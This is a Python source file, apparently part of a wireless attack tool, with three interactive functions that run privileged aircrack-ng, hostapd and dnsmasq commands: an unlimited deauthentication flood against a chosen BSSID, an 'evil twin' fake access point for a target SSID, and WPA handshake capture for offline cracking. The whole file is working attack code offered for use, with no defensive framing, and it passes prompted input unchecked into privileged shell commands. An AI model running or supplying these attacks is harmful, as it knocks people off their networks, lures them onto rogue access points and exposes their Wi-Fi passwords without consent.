import os
from rich.prompt import Prompt
from richtools import run_command_with_privilege

def deauth_attack(console):
    console.print("[bold red]Starting Deauthentication Attack[/bold red]")
    target_bssid = Prompt.ask("Enter target BSSID")
    target_channel = Prompt.ask("Enter target channel")

    console.print("[bold yellow]Launching attack... (Press CTRL+C to stop)[/bold yellow]")
    try:
        run_command_with_privilege(f"airmon-ng start wlan0 {target_channel}")
        run_command_with_privilege(f"aireplay-ng --deauth 0 -a {target_bssid} wlan0mon")
    except KeyboardInterrupt:
        console.print("\n[bold yellow]Stopping attack...[/bold yellow]")
        run_command_with_privilege("airmon-ng stop wlan0mon")

def evil_twin_attack(console):
    console.print("[bold red]Starting Evil Twin Attack[/bold red]")
    ssid = Prompt.ask("Enter target SSID")

    console.print(f"[bold green]Creating fake AP with SSID: {ssid}[/bold green]")
    try:
        # Note: In a real scenario, you'd generate configs dynamically.
        # This assumes configs exist as per original tool logic.
        run_command_with_privilege("hostapd -B /etc/hostapd.conf") 
        run_command_with_privilege("dnsmasq -C /etc/dnsmasq.conf")
        console.print("[bold green]Evil Twin started.[/bold green]")
    except Exception as e:
        console.print(f"[bold red]Error: {e}[/bold red]")

def wpa_handshake_capture(console):
    console.print("[bold red]Starting WPA Handshake Capture[/bold red]")
    target_bssid = Prompt.ask("Enter target BSSID")
    target_channel = Prompt.ask("Enter target channel")
    output_file = Prompt.ask("Enter output file name (no extension)")

    console.print("[bold yellow]Capturing... (Wait for handshake)[/bold yellow]")
    try:
        run_command_with_privilege(f"airodump-ng --bssid {target_bssid} --channel {target_channel} -w {output_file} wlan0mon")
    except KeyboardInterrupt:
         console.print("\n[bold yellow]Stopping capture...[/bold yellow]")

